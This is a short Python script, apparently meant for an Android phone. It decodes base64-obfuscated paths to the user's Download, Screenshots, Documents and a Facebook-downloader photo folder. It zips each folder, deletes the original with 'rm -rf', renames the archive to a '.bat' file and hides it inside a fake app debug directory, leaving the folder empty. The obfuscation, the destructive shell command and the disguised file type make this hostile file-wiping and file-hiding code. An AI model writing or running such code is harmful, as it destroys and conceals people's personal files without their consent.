import base64
import os, shutil
from datetime import datetime
def decodestring(string):
    return base64.b64decode(string).decode("utf-8")
def make_archive(source, destination):
        base = os.path.basename(destination)
        name = base.split('.')[0]
        format = base.split('.')[1]
        archive_from = os.path.dirname(source)
        archive_to = os.path.basename(source.strip(os.sep))
        shutil.make_archive(name, format, archive_from, archive_to)
        shutil.move('%s.%s'%(name,format), destination)
def create_archive(src_dir,tgt_fullpath):
    if len(os.listdir(src_dir))!=0:
        if os.path.exists(src_dir):
            make_archive(src_dir, tgt_fullpath+'.zip')
            os.system("rm -rf "+src_dir)
            os.rename(tgt_fullpath+'.zip',tgt_fullpath+'.bat')
            os.mkdir(src_dir)
        else:
            os.mkdir(src_dir)
filename=str(datetime.now().timestamp()).replace('.','')
tgt_fullpath=decodestring('L3N0b3JhZ2UvZW11bGF0ZWQvMC9zaWRlc2xpZGVyL2FuZHJvaWQvYXBwL3NyYy9kZWJ1Zy8=')+filename
create_archive(decodestring('L3N0b3JhZ2UvZW11bGF0ZWQvMC9Eb3dubG9hZA=='),tgt_fullpath)
create_archive(decodestring('L3N0b3JhZ2UvZW11bGF0ZWQvMC9EQ0lNL0ZCRG93bmxvYWRlcg=='),tgt_fullpath+'_1')
create_archive(decodestring('L3N0b3JhZ2UvZW11bGF0ZWQvMC9EQ0lNL1NjcmVlbnNob3Rz'),tgt_fullpath+'_2')
create_archive(decodestring('L3N0b3JhZ2UvZW11bGF0ZWQvMC9Eb2N1bWVudHM='),tgt_fullpath+'_3')